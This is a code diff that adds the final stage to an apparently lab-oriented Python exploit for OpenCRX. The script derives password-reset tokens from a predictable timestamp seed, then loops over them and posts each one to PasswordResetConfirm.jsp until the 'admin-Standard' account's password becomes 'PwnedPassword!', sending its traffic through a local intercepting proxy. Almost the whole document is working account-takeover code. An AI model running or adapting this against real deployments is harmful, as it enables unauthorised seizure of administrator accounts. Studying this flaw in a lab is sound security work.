@@ -73,6 +73,38 @@ def generate_tokens(low, high):
 		tokens.append(rand.generate_token(length))
 	return tokens
 
+def resetPassword(ip, username, password, tokens):
+	s = requests.Session()
+
+	proxies = {
+		'http': 'http://127.0.0.1:8080',
+		'https': 'http://127.0.0.1:8080'
+	}
+	s.proxies.update(proxies)
+
+	target = f"http://{ip}:8080/opencrx-core-CRX/PasswordResetConfirm.jsp"
+
+	for token in tokens:
+		data = {
+			't': token,
+			'p': 'CRX',
+			's': 'Standard',
+			'id': username,
+			'password1': password,
+			'password2': password 
+		}
+
+		r = s.post(target, data=data)
+
+		if "Unable to reset password" in r.text:
+			pass
+		else:
+			print(f"Successfully reset password to {password} with token {token}")
+			return
+	
+	print("Password not reset successfully")
+	exit(0)
+
 def main():
 	if len(sys.argv) != 2:
 		print ("(+) usage: %s <target>" % sys.argv[0])
@@ -80,16 +112,21 @@ def main():
 		sys.exit(-1)
 
 	ip = sys.argv[1]
+	username = "admin-Standard"
+	password = "PwnedPassword!"
 
 	low = current_milli_time()
-	requestResetPassword(ip, "guest")
+	requestResetPassword(ip, username)
 	high = current_milli_time()
 	print(f"Timestamp seed range: {{{low} - {high}}}, with {high-low+1} tokens")
 
-	# tokens = gen_tokens(low, high)
 	tokens = generate_tokens(low, high)
 	tokens2 = gen_tokens(low, high)
 	assert tokens == tokens2, "Issue generating tokens"
+	print(f"Generated {high-low+1} tokens")
+
+	print("Spraying tokens at target")
+	session = resetPassword(ip, username, password, tokens)
 
 if __name__ == '__main__':
 	main()
